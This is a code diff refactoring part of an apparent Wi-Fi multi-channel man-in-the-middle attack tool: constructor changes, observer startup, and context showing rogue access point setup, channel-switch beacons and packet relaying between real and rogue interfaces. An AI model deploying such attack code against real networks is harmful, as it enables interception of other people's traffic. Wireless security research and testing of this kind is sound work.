@@ -1,7 +1,6 @@
 #include "attacks/mc_mitm/mc_mitm.h"
 
 #include <chrono>
-#include <utility>
 #include <tins/tins.h>
 
 #include "attacks/DoS_hard/dos_helpers.h"
@@ -18,14 +17,17 @@ using namespace chrono;
 using namespace Tins;
 
 
-McMitm::McMitm(const ActorPtr &rogue_sta, const ActorPtr &rogue_ap, const ActorPtr &ap,
-				const string &client_mac, optional<filesystem::path> run_folder, const bool only_to_mitm
+McMitm::McMitm(const ActorPtr &rogue_sta, const ActorPtr &rogue_ap,
+				const ActorPtr &sta, const ActorPtr &ap,
+				const optional<filesystem::path> &run_folder,
+				const bool only_to_mitm
 )
 : rogue_sta(rogue_sta),
 rogue_ap(rogue_ap),
+sta(sta),
 ap(ap),
 only_to_mitm(only_to_mitm),
-client_state(client_mac, run_folder ? optional{run_folder.value() / "observer" / "client_state"} : nullopt) {
+client_state(sta.get(SK::mac), run_folder ? optional{run_folder.value() / "observer" / "client_state"} : nullopt) {
 	if (run_folder) { create_public_dirs( run_folder.value() / "observer" / "client_state"); }
 }
 
@@ -196,6 +198,8 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
 	log(LogLevel::INFO, "Giving the rogue AP one second to initialize ...");
 	this_thread::sleep_for(seconds(1));
 
+	rs.start_observers();
+
 	// first disconnect
 	send_csa_beacon(4);
 	client_state.update_state(ClientState::Sent_to_rogue);
@@ -224,7 +228,7 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
 		const int fd_real = pcap_get_selectable_fd(sock_real->get_pcap_handle());
 		const int fd_rogue = pcap_get_selectable_fd(sock_rogue->get_pcap_handle());
 
-		//log(LogLevel::DEBUG, "fd_real={} fd_rogue={}", fd_real, fd_rogue);
+		// log(LogLevel::DEBUG, "fd_real={} fd_rogue={}", fd_real, fd_rogue);
 		if(fd_real < 0 || fd_rogue < 0)
 			log(LogLevel::ERROR, "pcap_get_selectable_fd failed: fd_real={} fd_rogue={}", fd_real, fd_rogue);
 
